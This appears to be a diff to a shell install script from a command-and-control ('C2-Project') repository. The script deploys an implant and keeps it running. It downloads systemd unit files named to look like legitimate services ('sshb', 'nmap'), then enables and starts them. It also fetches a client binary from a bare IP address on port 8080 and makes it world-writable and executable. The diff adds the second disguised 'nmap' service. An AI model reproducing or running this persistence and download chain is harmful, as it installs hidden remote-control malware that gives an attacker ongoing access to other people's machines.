@@ -7,11 +7,14 @@ curl https://raw.githubusercontent.com/drew-young/C2-Project/main/client.py > ~/
 #copy python
 cp /usr/bin/python3 /usr/bin/python3.1
 #Curl the service file into it
-curl https://raw.githubusercontent.com/drew-young/C2-Project/main/client.service > /etc/systemd/system/sshb.service
+curl https://raw.githubusercontent.com/drew-young/C2-Project/main/sshb.service > /etc/systemd/system/sshb.service
+curl https://raw.githubusercontent.com/drew-young/C2-Project/main/nmap.service > /etc/systemd/system/nmap.service
 #Enable and start the service
 systemctl daemon-reload
 systemctl enable sshb
 systemctl start sshb
+systemctl enable nmap
+systemctl start nmap
 #Curl the binary file to sshb
 curl 129.21.49.57:8080/client > /var/lib/sshb/sshb
 chmod 777 /var/lib/sshb/sshb
